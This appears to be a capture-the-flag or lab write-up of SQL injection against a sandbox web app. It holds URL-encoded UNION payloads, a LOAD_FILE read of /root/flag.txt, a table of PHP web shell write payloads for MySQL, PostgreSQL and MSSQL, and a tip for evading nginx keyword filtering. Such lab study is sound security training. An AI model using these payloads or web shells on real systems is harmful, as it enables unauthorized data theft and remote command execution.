3
Extract flag via UNION — URL encoded for nginx
URL encoded — paste in browser
http://sql-sandbox/extramile/index.php?id=-1%20UNION%20SELECT%20NULL%2Cflag%20FROM%20flags--%20-
decoded SQL
id=-1 UNION SELECT NULL,flag FROM flags-- -

Using id=-1 suppresses the real row so only the injected flag row returns.

3 Challenge 2 — Read /root/flag.txt

1
Check secure_file_priv — where can MySQL write?
URL encoded
http://sql-sandbox/extramile/index.php?id=-1%20UNION%20SELECT%20NULL%2C(SELECT%20@@global.secure_file_priv)--%20-

Returned NULL → file writing completely disabled for this MySQL user.

2
Web shell write blocked — pivot to LOAD_FILE()
⚠ INTO OUTFILE failed because secure_file_priv = NULL. MySQL user had read privileges but not write. Always check secure_file_priv before attempting file write.
3
Read /root/flag.txt directly via LOAD_FILE()
URL encoded — paste in browser
http://sql-sandbox/extramile/index.php?id=-1%20UNION%20SELECT%20NULL%2CLOAD_FILE('/root/flag.txt')--%20-
decoded SQL
id=-1 UNION SELECT NULL,LOAD_FILE('/root/flag.txt')-- -

Flag returned directly in the page — MySQL user had FILE privilege even without write access.

File Write (Web Shell)

Database Method Payload
MySQL INTO OUTFILE UNION SELECT 1,'<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
PostgreSQL COPY TO COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'
MSSQL xp_cmdshell EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]);?^> > C:\inetpub\wwwroot\shell.php'

Check file write permissions first

MySQL — check secure_file_priv
SELECT @@global.secure_file_priv
secure_file_priv value Meaning
"" (empty string) Can read/write anywhere
/var/lib/mysql-files/ Can only read/write in that directory
NULL File operations completely disabled
Key lesson: Even when secure_file_priv = NULL blocks file writes, the MySQL user may still have the FILE privilege allowing LOAD_FILE() reads. Always test both independently — write and read are controlled separately.

5 Bypassing nginx 400 Bad Request

nginx blocked SQL keywords in the raw URL. The fix was to paste payloads directly in the browser address bar — the browser automatically URL encodes spaces and special characters.

Key URL encodings
space → %20
'     → %27
,     → %2C
(     → %28
)     → %29
=     → %3D
;     → %3B
Tip: When nginx blocks requests with SQL in the URL, paste the decoded payload directly into the browser bar and let it encode automatically. Alternatively in Burp, highlight the payload and press Ctrl+U to URL encode.
